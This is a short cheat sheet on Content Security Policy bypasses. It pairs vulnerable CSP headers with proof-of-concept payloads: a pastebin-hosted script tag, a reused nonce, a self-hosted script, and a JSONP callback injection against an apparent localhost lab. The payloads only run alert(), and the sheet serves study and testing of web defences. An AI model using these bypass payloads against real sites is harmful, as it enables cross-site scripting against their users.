# Content Security Policy (CSP) Bypass

## Pastebin CSP
Vulnerable:
```http
Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;
```
Detail error:
https://pastebin.com seems to be an valid CSP.

POC:
```js
<script src="https://pastebin.com/raw/R570EE00"></script>
```

## Invalid CSP Keyword
Vulnerable:
```http
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=
```
Detail error:
nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA= seems to be an invalid CSP keyword.

POC:
```js
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
```

## SELF
Vulnerable:
```js
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=
Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;
```
Detail error:
'self' can be problematic if you host JSONP, Angular or user uploaded files.

POC:
```js
poc.js:
alert(document.domain);

<script src="poc.js"></script>
```

## Self-insecure JSONP implementation
Vulnerable:
```js
Content-Security-Policy: script-src 'self';
```
Detail error:
'self' can be problematic if you host JSONP

POC:
http://localhost/vulnerabilities/csp/source/jsonp.php?callback=alert(document.domain)

## BESTTT :)
* https://csp-evaluator.withgoogle.com/
* https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques
